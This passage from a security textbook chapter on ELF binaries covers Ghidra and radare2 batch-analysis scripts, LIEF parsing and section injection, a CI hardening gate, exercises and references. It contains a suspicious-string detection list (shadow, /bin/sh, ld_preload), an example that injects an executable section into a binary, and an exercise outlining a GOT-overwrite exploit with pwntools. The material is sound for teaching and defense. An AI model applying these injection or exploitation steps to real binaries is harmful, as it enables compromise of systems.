find "$INPUT_DIR" -type f -executable | while read -r bin; do
    file "$bin" | grep -q 'ELF' || continue
    echo "[*] Importing: $bin"
    "$GHIDRA_HOME/support/analyzeHeadless" \
        "$PROJECT_DIR" "$PROJECT_NAME" \
        -import "$bin" \
        -postScript ExportFunctions.py "$OUTPUT_DIR" \
        -scriptPath "$OUTPUT_DIR/scripts" \
        -noanalysis \
        -max-cpu 4 \
        -log "$OUTPUT_DIR/ghidra_batch.log" 2>/dev/null
done

rm -rf "$PROJECT_DIR"
echo "[+] Batch analysis complete. Results in $OUTPUT_DIR"
```

**Ghidra Python script for function extraction and decompilation:**

```python
# ExportFunctions.py — Ghidra headless script
# Exports function list and decompiled output to JSON
# Place in Ghidra's script directory or pass via -scriptPath
# Run with: analyzeHeadless ... -postScript ExportFunctions.py <output_dir>

import json
import os
from ghidra.app.decompiler import DecompInterface
from ghidra.util.task import ConsoleTaskMonitor

def run():
    args = getScriptArgs()
    output_dir = args[0] if args else "/tmp"

    program = getCurrentProgram()
    binary_name = program.getName()
    output_file = os.path.join(output_dir, binary_name + ".functions.json")

    # Initialize decompiler
    decomp = DecompInterface()
    decomp.openProgram(program)
    monitor = ConsoleTaskMonitor()

    functions = []
    func_manager = program.getFunctionManager()

    for func in func_manager.getFunctions(True):
        entry = func.getEntryPoint()
        body = func.getBody()
        size = body.getNumAddresses()

        # Attempt decompilation (timeout 30s per function)
        result = decomp.decompileFunction(func, 30, monitor)
        decomp_text = ""
        if result and result.decompileCompleted():
            decomp_text = result.getDecompiledFunction().getC()

        functions.append({
            "name": func.getName(),
            "address": str(entry),
            "size": int(size),
            "is_thunk": func.isThunk(),
            "calling_convention": func.getCallingConventionName(),
            "parameter_count": func.getParameterCount(),
            "decompiled": decomp_text[:2000]  # truncate large functions
        })

    decomp.dispose()

    with open(output_file, 'w') as f:
        json.dump({
            "binary": binary_name,
            "function_count": len(functions),
            "functions": functions
        }, f, indent=2)

    println("[+] Exported {} functions to {}".format(len(functions), output_file))

run()
```

### 24.3 Radare2/rizin automation with r2pipe

Radare2 (and its fork, rizin) provide a pipe-based API (`r2pipe` / `rzpipe`) for programmatic analysis. This is faster than Ghidra headless for lightweight batch tasks: import enumeration, cross-reference extraction, and string analysis.

```python
#!/usr/bin/env python3
"""Batch ELF analysis using r2pipe — extract imports, strings, and xrefs."""
import json
import sys
import r2pipe

def analyze_binary(path: str) -> dict:
    r2 = r2pipe.open(path, flags=["-2"])  # -2 = suppress stderr
    r2.cmd("aaa")  # full analysis

    # Extract metadata
    info = r2.cmdj("ij")  # binary info as JSON

    # Extract imports
    imports = r2.cmdj("iij") or []  # imports as JSON
    import_names = [imp.get("name", "") for imp in imports]

    # Extract exports
    exports = r2.cmdj("iEj") or []
    export_names = [exp.get("name", "") for exp in exports]

    # Extract strings with addresses
    strings = r2.cmdj("izj") or []
    interesting_strings = [
        {"vaddr": hex(s["vaddr"]), "string": s["string"]}
        for s in strings
        if any(kw in s.get("string", "").lower()
               for kw in ["passwd", "shadow", "root", "/bin/sh", "exec",
                          "socket", "connect", "ld_preload", "memfd"])
    ]

    # Extract functions
    functions = r2.cmdj("aflj") or []
    func_summary = [
        {"name": f["name"], "addr": hex(f["offset"]), "size": f["size"]}
        for f in functions[:500]  # cap at 500 for large binaries
    ]

    # Security info
    checksec = r2.cmdj("iSj") or []  # sections with permissions
    rwx_sections = [
        s["name"] for s in checksec
        if s.get("perm", "").count("r") and
           s.get("perm", "").count("w") and
           s.get("perm", "").count("x")
    ]

    r2.quit()

    return {
        "file": path,
        "format": info.get("bin", {}).get("class", ""),
        "arch": info.get("bin", {}).get("arch", ""),
        "bits": info.get("bin", {}).get("bits", 0),
        "stripped": info.get("bin", {}).get("stripped", False),
        "static": info.get("bin", {}).get("static", False),
        "import_count": len(imports),
        "imports": import_names[:50],
        "export_count": len(exports),
        "exports": export_names[:50],
        "function_count": len(functions),
        "functions": func_summary,
        "interesting_strings": interesting_strings,
        "rwx_sections": rwx_sections
    }

if __name__ == "__main__":
    result = analyze_binary(sys.argv[1])
    print(json.dumps(result, indent=2))
```

```bash
# Batch analysis with r2pipe
find /opt/container/rootfs -type f -executable | while read -r bin; do
    file "$bin" | grep -q 'ELF' && python3 r2_analyze.py "$bin" >> /tmp/r2_results.jsonl
done

# Query results (e.g., find binaries importing execve but not from expected packages)
jq -r 'select(.imports | index("execve")) | .file' /tmp/r2_results.jsonl
```

### 24.4 LIEF for ELF manipulation and rebuilding

LIEF (Library to Instrument Executable Formats) provides a comprehensive Python API for parsing, modifying, and rebuilding ELF binaries. Unlike pwntools (which focuses on exploitation), LIEF handles structural modifications: adding sections, modifying segments, injecting code, and rewriting dynamic entries.

```python
#!/usr/bin/env python3
"""LIEF-based ELF analysis and modification examples."""
import lief

# --- Parse and inspect ---
binary = lief.parse("./target")

# Header information
header = binary.header
print(f"Type: {header.file_type}")
print(f"Machine: {header.machine_type}")
print(f"Entry: {hex(header.entrypoint)}")

# Enumerate segments with security-relevant metadata
for seg in binary.segments:
    flags = ""
    if seg.has(lief.ELF.SEGMENT_FLAGS.R): flags += "R"
    if seg.has(lief.ELF.SEGMENT_FLAGS.W): flags += "W"
    if seg.has(lief.ELF.SEGMENT_FLAGS.X): flags += "X"
    print(f"  {seg.type.name:<15} vaddr={hex(seg.virtual_address):<14} "
          f"memsz={hex(seg.virtual_size):<10} flags={flags}")

# Enumerate dynamic entries
for entry in binary.dynamic_entries:
    if entry.tag == lief.ELF.DYNAMIC_TAGS.NEEDED:
        print(f"  NEEDED: {entry.name}")
    elif entry.tag == lief.ELF.DYNAMIC_TAGS.RPATH:
        print(f"  RPATH: {entry.name}  [SECURITY: check for $ORIGIN]")
    elif entry.tag == lief.ELF.DYNAMIC_TAGS.RUNPATH:
        print(f"  RUNPATH: {entry.name}")

# Check hardening posture programmatically
has_relro = any(s.type == lief.ELF.SEGMENT_TYPES.GNU_RELRO for s in binary.segments)
has_bind_now = any(
    e.tag == lief.ELF.DYNAMIC_TAGS.FLAGS and
    e.value & lief.ELF.DYNAMIC_FLAGS.BIND_NOW
    for e in binary.dynamic_entries
) or any(
    e.tag == lief.ELF.DYNAMIC_TAGS.FLAGS_1 and
    e.value & lief.ELF.DYNAMIC_FLAGS_1.NOW
    for e in binary.dynamic_entries
)
has_nx_stack = True  # default; check for RWX GNU_STACK
for seg in binary.segments:
    if seg.type == lief.ELF.SEGMENT_TYPES.GNU_STACK:
        has_nx_stack = not seg.has(lief.ELF.SEGMENT_FLAGS.X)

print(f"\nHardening: RELRO={'Full' if has_relro and has_bind_now else 'Partial' if has_relro else 'None'}")
print(f"           NX Stack={has_nx_stack}")
print(f"           PIE={header.file_type == lief.ELF.E_TYPE.DYNAMIC}")

# --- Modify: add a new section (for code injection analysis) ---
new_section = lief.ELF.Section(".injected")
new_section.type = lief.ELF.SECTION_TYPES.PROGBITS
new_section.flags = lief.ELF.SECTION_FLAGS.ALLOC | lief.ELF.SECTION_FLAGS.EXECINSTR
new_section.content = list(b"\xcc" * 64)  # INT3 sled for testing
new_section.alignment = 16

binary.add(new_section, loaded=True)
binary.write("./modified_target")

print(f"\n[+] Added .injected section, wrote ./modified_target")
```

```bash
# LIEF one-liner: check all binaries in a directory for missing Full RELRO
python3 -c "
import lief, sys, os
for root, dirs, files in os.walk(sys.argv[1]):
    for fname in files:
        path = os.path.join(root, fname)
        try:
            b = lief.parse(path)
            if b is None or not isinstance(b, lief.ELF.Binary):
                continue
        except Exception:
            continue
        relro = any(s.type == lief.ELF.SEGMENT_TYPES.GNU_RELRO for s in b.segments)
        now = any(
            (e.tag == lief.ELF.DYNAMIC_TAGS.FLAGS_1 and e.value & 1)
            for e in b.dynamic_entries
        )
        if relro and not now:
            print(f'Partial RELRO: {path}')
        elif not relro:
            print(f'No RELRO: {path}')
" /usr/bin/
```

### 24.5 CI/CD integration for binary security scanning

Embedding ELF hardening checks into the CI/CD pipeline catches security regressions before deployment. The pipeline should verify hardening flags, scan for known vulnerabilities in linked libraries, and reject binaries that fail policy.

**GitHub Actions example:**

```yaml
# .github/workflows/binary-security.yml
name: ELF Binary Security Gate

on:
  push:
    branches: [main]
  pull_request:

jobs:
  binary-security:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: make release

      - name: Install security tools
        run: |
          pip install checksec.py lief
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

      - name: Hardening policy check
        run: |
          FAIL=0
          for bin in ./build/bin/*; do
              file "$bin" | grep -q 'ELF' || continue
              echo "=== Checking: $bin ==="

              # RELRO check
              RELRO=$(readelf -l "$bin" 2>/dev/null | grep -c GNU_RELRO)
              BIND_NOW=$(readelf -d "$bin" 2>/dev/null | grep -c BIND_NOW)
              if [ "$RELRO" -eq 0 ] || [ "$BIND_NOW" -eq 0 ]; then
                  echo "FAIL: $bin missing Full RELRO"
                  FAIL=1
              fi

              # NX stack check
              RWX_STACK=$(readelf -l "$bin" 2>/dev/null | grep GNU_STACK | grep -c 'RWE')
              if [ "$RWX_STACK" -gt 0 ]; then
                  echo "FAIL: $bin has executable stack"
                  FAIL=1
              fi

              # PIE check
              ELF_TYPE=$(readelf -h "$bin" 2>/dev/null | grep Type | awk '{print $2}')
              if [ "$ELF_TYPE" != "DYN" ]; then
                  echo "FAIL: $bin is not PIE"
                  FAIL=1
              fi

              # Stack canary check
              CANARY=$(nm -D "$bin" 2>/dev/null | grep -c __stack_chk_fail)
              if [ "$CANARY" -eq 0 ]; then
                  echo "WARN: $bin missing stack canary"
              fi
          done
          exit $FAIL

      - name: Vulnerability scan
        run: |
          syft dir:./build/bin -o cyclonedx-json > sbom.json
          grype sbom:sbom.json --fail-on high

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json
```

**Makefile integration for local development:**

```makefile
# Hardening flags — mandatory for all targets
HARDENING_CFLAGS  = -fstack-protector-strong -fstack-clash-protection \
                    -D_FORTIFY_SOURCE=2 -fPIE -fcf-protection
HARDENING_LDFLAGS = -Wl,-z,relro,-z,now -pie -Wl,-z,noexecstack

CFLAGS  += $(HARDENING_CFLAGS)
LDFLAGS += $(HARDENING_LDFLAGS)

.PHONY: security-check
security-check: $(TARGET)
	@echo "--- Hardening verification ---"
	@checksec --file=$(TARGET) --output=json | \
	    python3 -c "import json,sys; d=json.load(sys.stdin); \
	    r=d[list(d.keys())[0]]; \
	    ok=r['relro']=='full' and r['canary']=='yes' and \
	       r['nx']=='yes' and r['pie']=='yes'; \
	    print('PASS' if ok else 'FAIL: '+json.dumps(r)); \
	    sys.exit(0 if ok else 1)"
```

---

## 25. Cross-references for follow-on work

When you write detections, hardening rules, or analysis tooling that touches this chapter's material, the following bind together:

A binary's hardening posture is encoded across `DT_FLAGS`/`DT_FLAGS_1` (BIND_NOW), `PT_GNU_RELRO` (RELRO), `PT_GNU_STACK` permissions (NX stack), `PT_GNU_PROPERTY` (CET/BTI), the presence/absence of stack canaries (look for `__stack_chk_fail` import), and PIE vs non-PIE. A "hardening report" rule that just looks for one of these is incomplete; a thorough one walks all of them and reports on the matrix. The compiler-flag table in §18.1 maps each flag to its structural effect; `checksec` (§18.2) automates the check.

A binary's interception surface is encoded in its dynamic symbol table (which symbols are interposable), its visibility annotations (`STV_HIDDEN`/`STV_PROTECTED`), its `DT_FLAGS` `DF_SYMBOLIC` bit, and whether it is statically vs dynamically linked. For an EDR thinking about userland hooking strategies, this matrix is decisive. The dynamic-linker exploitation techniques in §14 demonstrate how this surface is abused.

A binary's analyzability is encoded in the presence of `.symtab`/`.strtab` (stripping), the build-ID note (matching to debuginfo), and the `.gnu_debuglink` section. A binary missing all three is harder to analyze but easy to flag. The YARA rules in §16 automate this detection.

The GOT/PLT exploitation techniques in §13 are the offensive counterpart to the RELRO mitigation (§11.4, §18.1). The pwntools workflows in §17 operationalize both attack and defense. The forensic workflows in §19 close the loop by providing post-incident analysis capability.

The loader security deep dive in §21 details the dynamic linker's attack surface and its CVE history. The container analysis workflows in §22 extend binary hardening verification into cloud-native environments. The advanced malware techniques in §23 cover the current threat landscape for ELF-based implants. The analysis automation in §24 provides the tooling to operationalize detection at scale.

Chapter 1B picks up at TLS and the security segments: constructor/destructor ordering (referenced from §13.5–§13.6), symbol versioning (referenced from §14.7), IFUNC resolution, CET/BTI integration with `.plt.sec` (referenced from §13.3), and the audit interface (referenced from §14.4). Chapter 2 pivots to PE/COFF and tracks the same anatomical layout (file header → segments → imports → exception data → security/load-config → debug → TLS) on the Windows side, where many of the same problems are solved differently and a few — Authenticode, the load-configuration directory, the CLR descriptor — have no ELF analogue.

---

## Exercises

1. **ELF Header Triage Lab.** Using `readelf -h`, `readelf -l`, and `readelf -S`, produce a complete structural fingerprint of three binaries: a PIE-compiled utility (`/usr/bin/ls`), a statically linked binary (compile one with `gcc -static`), and a packed binary (pack one with `upx`). For each, document: `e_type`, entry point, presence/absence of `PT_INTERP`, `PT_GNU_RELRO`, `PT_GNU_STACK` permissions, and section header count. Identify which signals differentiate the packed binary from the others. Reference: `tutorials/tutorial_domain1_ch1A_elf_lab.md`.

2. **GOT Overwrite Exploitation.** Compile the vulnerable format-string program from §13.1 with partial RELRO (`gcc -Wl,-z,relro -no-pie -o vuln vuln.c`). Using pwntools, leak a libc address through the GOT, compute the libc base, and overwrite the `puts` GOT entry with `system`. Verify the exploit succeeds, then recompile with full RELRO (`-Wl,-z,relro,-z,now`) and confirm the exploit fails with SIGSEGV. Document the RELRO difference using `checksec`.

3. **YARA Rule Development.** Write three YARA rules targeting: (a) ELF binaries with no section header table (`e_shoff == 0`), (b) binaries with `PT_LOAD` segments having `RWX` permissions, and (c) binaries where `e_entry` points outside any executable segment. Test each rule against the sample set from Exercise 1. Map each detection to a MITRE ATT&CK technique (T1027 Obfuscated Files, T1055 Process Injection).

4. **Dynamic Linker Abuse Detection.** Set up an auditd configuration that alerts on `LD_PRELOAD` injection (monitor `/etc/ld.so.preload` and `execve` with `LD_PRELOAD` in the environment). Inject a benign `LD_PRELOAD` library that hooks `read()` and verify the auditd alert fires. Then test with `AT_SECURE` by targeting a setuid binary and confirm `LD_PRELOAD` is ignored.

5. **Entropy Analysis for Packed Binaries.** Using the Python entropy script from §15.2, analyze the section-by-section entropy of a UPX-packed binary, a custom-XOR-encrypted binary, and a normal compiled binary. Plot the entropy distributions. Establish thresholds for `.text` section entropy that distinguish packed from normal binaries with a false-positive rate below 5%.

---

## Readings and References

- System V Application Binary Interface — AMD64 Architecture Processor Supplement (x86_64 psABI): https://gitlab.com/x86-psABIs/x86-64-ABI (retrieved: 2026-05-29)
- ELF Specification (gABI) — Tool Interface Standard: https://refspecs.linuxfoundation.org/elf/elf.pdf (retrieved: 2026-05-29)
- Linux `elf(5)` man page: https://man7.org/linux/man-pages/man5/elf.5.html (retrieved: 2026-05-29)
- glibc dynamic linker source (`elf/rtld.c`, `elf/dl-runtime.c`): https://sourceware.org/git/?p=glibc.git;a=tree;f=elf (retrieved: 2026-05-29)
- Linux kernel `fs/binfmt_elf.c` — ELF binary loader: https://elixir.bootlin.com/linux/latest/source/fs/binfmt_elf.c (retrieved: 2026-05-29)
- MITRE ATT&CK T1574.006 — Hijack Execution Flow: Dynamic Linker Hijacking: https://attack.mitre.org/techniques/T1574/006/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1027 — Obfuscated Files or Information: https://attack.mitre.org/techniques/T1027/ (retrieved: 2026-05-29)
- CVE-2023-4911 — Looney Tunables (glibc ld.so buffer overflow): https://nvd.nist.gov/vuln/detail/CVE-2023-4911 (retrieved: 2026-05-29)
- CVE-2010-3856 — glibc `LD_AUDIT` `$ORIGIN` expansion privilege escalation: https://nvd.nist.gov/vuln/detail/CVE-2010-3856 (retrieved: 2026-05-29)
- checksec.sh — binary hardening checker: https://github.com/slimm609/checksec.sh (retrieved: 2026-05-29)
- pwntools documentation: https://docs.pwntools.com/en/stable/ (retrieved: 2026-05-29)
- HackTricks — ELF Tricks: https://hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.html (retrieved: 2026-05-29)
- "Dissecting and Exploiting ELF Files" — 0x434b.dev: https://0x434b.dev/dissecting-and-exploiting-elf-files/ (retrieved: 2026-05-29)

---

## Cross-References

| Chapter | Topic | Relationship |
|---------|-------|-------------|
| `domain1_chapter1B_elf_advanced.md` | TLS, IFUNC, CET/BTI, .eh_frame, symbol versioning | Extends all structures introduced here; constructor/destructor ordering, security segments, hardware CFI |
| `domain1_chapter2_pe_coff.md` | PE/COFF format, IAT, CFG, Authenticode | Windows counterpart — same problems (loading, relocation, hardening) solved differently |
| `domain2_chapter2A_process_memory.md` | ASLR, mmap, page tables, Stack Clash, Dirty COW | Kernel-side machinery for segment loading, address randomization, memory protections |
| `domain3_chapter3A_stack_format_integer.md` | Format string GOT writes, stack canary from AT_RANDOM | Format string exploitation targets GOT entries; canary is seeded from auxv |
| `domain3_chapter3B_heap_uaf.md` | Heap exploitation, tcache poisoning | Heap corruption primitives used to achieve GOT overwrites and function pointer hijacks |
| `domain4_code_reuse_attacks.md` | ROP, JOP, ret2dlresolve, CFI | Code reuse payloads delivered via GOT/PLT hijack; ret2dlresolve abuses _dl_fixup |

---

## Glossary

- **ELF (Executable and Linkable Format):** The standard binary format for executables, shared libraries, and object files on Linux and most Unix-like systems.
- **GOT (Global Offset Table):** An array of pointers in the data segment used to resolve addresses of global variables and functions in shared libraries at runtime.
- **PLT (Procedure Linkage Table):** A set of code stubs in the text segment that mediate calls to dynamically-linked functions via the GOT.
- **RELRO (RELocation Read-Only):** A linker hardening mechanism that marks relocation-target memory (including the GOT) as read-only after the dynamic linker completes initial relocation.
- **Lazy Binding:** The deferred resolution of function addresses through the PLT; the dynamic linker resolves a symbol on first call rather than at load time.
- **ASLR (Address Space Layout Randomization):** A kernel-level mitigation that randomizes the base addresses of executables, libraries, stack, and heap to make exploitation harder.
- **PIE (Position-Independent Executable):** An executable compiled to be loadable at any base address, enabling full ASLR for the main binary.
- **`.dynamic` Section:** An array of tag-value pairs that serves as the dynamic linker's table of contents for all dynamic-linking metadata.
- **`DT_NEEDED`:** A dynamic section tag naming a required shared library dependency.
- **`AT_SECURE`:** An auxiliary vector entry set by the kernel for setuid/setgid/file-capability binaries, causing the dynamic linker to ignore `LD_PRELOAD` and related variables.
- **`_dl_runtime_resolve`:** The glibc dynamic linker function invoked on first call through a lazily-bound PLT stub; resolves the symbol and patches the GOT.
- **Bloom Filter:** A probabilistic data structure used in `.gnu.hash` to quickly reject symbols not present in a shared object, avoiding expensive hash-chain walks.
- **Build ID:** A unique hash (typically SHA-1) embedded in a `PT_NOTE` segment that identifies a specific build of a binary for debuginfo matching.
- **YARA:** A pattern-matching tool used for malware identification and binary classification based on textual and binary signatures.
- **UPX (Ultimate Packer for eXecutables):** A widely-used open-source executable packer that compresses ELF and PE binaries.
